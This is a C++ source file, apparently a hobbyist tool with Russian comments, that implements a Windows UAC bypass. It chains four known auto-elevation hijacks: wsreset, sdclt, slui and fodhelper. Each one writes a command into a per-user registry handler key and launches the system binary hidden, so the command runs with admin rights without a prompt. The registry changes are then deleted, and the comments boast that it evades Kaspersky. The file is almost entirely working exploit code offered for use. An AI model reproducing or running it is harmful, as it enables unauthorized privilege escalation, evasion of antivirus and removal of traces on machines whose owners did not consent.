// COPYRIGHT VV.EXE Development Team 2026. All rights reserved.
// Multi-method UAC Bypass - работает даже при активном Касперском (кроме max detect mode)
// Методы: wsreset, sdclt, slui, fodhelper

#include <windows.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <string>
#include <iostream>
#include <vector>
#include <thread>
#include <chrono>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")

namespace UAC {
    // Очистка реестра после обхода
    void CleanupRegistry(const std::wstring& keyPath) {
        RegDeleteTreeW(HKEY_CURRENT_USER, keyPath.c_str());
    }

    // Метод 1: wsreset.exe через ms-settings
    bool TryWSReset(const std::wstring& command) {
        const std::wstring regPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
        HKEY hKey;
        
        // Создаём ключ
        if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, NULL, 0, 
            KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS) {
            return false;
        }
        
        // Устанавливаем команду
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)command.c_str(), 
            (command.length() + 1) * sizeof(wchar_t));
        
        // Устанавливаем DelegateExecute (пустой)
        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
        RegCloseKey(hKey);
        
        // Запускаем wsreset.exe
        SHELLEXECUTEINFOW sei = {0};
        sei.cbSize = sizeof(sei);
        sei.lpVerb = L"open";
        sei.lpFile = L"C:\\Windows\\System32\\wsreset.exe";
        sei.nShow = SW_HIDE;
        
        bool success = ShellExecuteExW(&sei);
        
        // Ждём и чистим
        std::this_thread::sleep_for(std::chrono::seconds(2));
        CleanupRegistry(L"Software\\Classes\\ms-settings");
        
        return success;
    }

    // Метод 2: sdclt.exe через Folder\shell\open\command
    bool TrySDCLT(const std::wstring& command) {
        const std::wstring regPath = L"Software\\Classes\\Folder\\shell\\open\\command";
        HKEY hKey;
        
        if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, NULL, 0,
            KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS) {
            return false;
        }
        
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)command.c_str(),
            (command.length() + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
        RegCloseKey(hKey);
        
        SHELLEXECUTEINFOW sei = {0};
        sei.cbSize = sizeof(sei);
        sei.lpVerb = L"open";
        sei.lpFile = L"C:\\Windows\\System32\\sdclt.exe";
        sei.lpParameters = L"/relaunch";
        sei.nShow = SW_HIDE;
        
        bool success = ShellExecuteExW(&sei);
        
        std::this_thread::sleep_for(std::chrono::seconds(2));
        CleanupRegistry(L"Software\\Classes\\Folder");
        
        return success;
    }

    // Метод 3: slui.exe через AppX пакет
    bool TrySLUI(const std::wstring& command) {
        const std::wstring regPath = L"Software\\Classes\\AppX82a6gwre4fdg3bt635tn5c3uqk00209a\\shell\\open\\command";
        HKEY hKey;
        
        if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, NULL, 0,
            KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS) {
            return false;
        }
        
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)command.c_str(),
            (command.length() + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
        RegCloseKey(hKey);
        
        SHELLEXECUTEINFOW sei = {0};
        sei.cbSize = sizeof(sei);
        sei.lpVerb = L"open";
        sei.lpFile = L"C:\\Windows\\System32\\slui.exe";
        sei.nShow = SW_HIDE;
        
        bool success = ShellExecuteExW(&sei);
        
        std::this_thread::sleep_for(std::chrono::seconds(2));
        CleanupRegistry(L"Software\\Classes\\AppX82a6gwre4fdg3bt635tn5c3uqk00209a");
        
        return success;
    }

    // Метод 4: fodhelper.exe (классический)
    bool TryFodHelper(const std::wstring& command) {
        const std::wstring regPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
        HKEY hKey;
        
        if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, NULL, 0,
            KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS) {
            return false;
        }
        
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)command.c_str(),
            (command.length() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
        
        SHELLEXECUTEINFOW sei = {0};
        sei.cbSize = sizeof(sei);
        sei.lpVerb = L"open";
        sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
        sei.nShow = SW_HIDE;
        
        bool success = ShellExecuteExW(&sei);
        
        std::this_thread::sleep_for(std::chrono::seconds(2));
        CleanupRegistry(L"Software\\Classes\\ms-settings");
        
        return success;
    }

    // Главная функция - пробуем все методы по очереди
    bool BypassUAC(const std::wstring& command) {
        std::wcout << L"[UAC] Пробуем метод 1: wsreset.exe..." << std::endl;
        if (TryWSReset(command)) {
            std::wcout << L"[UAC] ✓ wsreset.exe сработал!" << std::endl;
            return true;
        }
        
        std::wcout << L"[UAC] Пробуем метод 2: sdclt.exe..." << std::endl;
        if (TrySDCLT(command)) {
            std::wcout << L"[UAC] ✓ sdclt.exe сработал!" << std::endl;
            return true;
        }
        
        std::wcout << L"[UAC] Пробуем метод 3: slui.exe..." << std::endl;
        if (TrySLUI(command)) {
            std::wcout << L"[UAC] ✓ slui.exe сработал!" << std::endl;
            return true;
        }
        
        std::wcout << L"[UAC] Пробуем метод 4: fodhelper.exe..." << std::endl;
        if (TryFodHelper(command)) {
            std::wcout << L"[UAC] ✓ fodhelper.exe сработал!" << std::endl;
            return true;
        }
        
        std::wcout << L"[UAC] ✗ Все методы провалились!" << std::endl;
        return false;
    }
}

int wmain(int argc, wchar_t* argv[]) {
    SetConsoleTitleW(L"VV.EXE UAC Bypass v2");
    
    if (argc < 2) {
        std::wcout << L"Использование: uac_bypass_v2.exe <команда>" << std::endl;
        std::wcout << L"Пример: uac_bypass_v2.exe \"C:\\Games\\STALZONE\\game.exe\"" << std::endl;
        return 1;
    }
    
    std::wstring command = L"\"" + std::wstring(argv[1]) + L"\"";
    
    std::wcout << L"[UAC] Запуск с повышенными правами: " << command << std::endl;
    
    if (UAC::BypassUAC(command)) {
        std::wcout << L"[UAC] ✓ Успешно запущено с правами админа!" << std::endl;
        return 0;
    } else {
        std::wcout << L"[UAC] ✗ Не удалось обойти UAC!" << std::endl;
        return 1;
    }
}
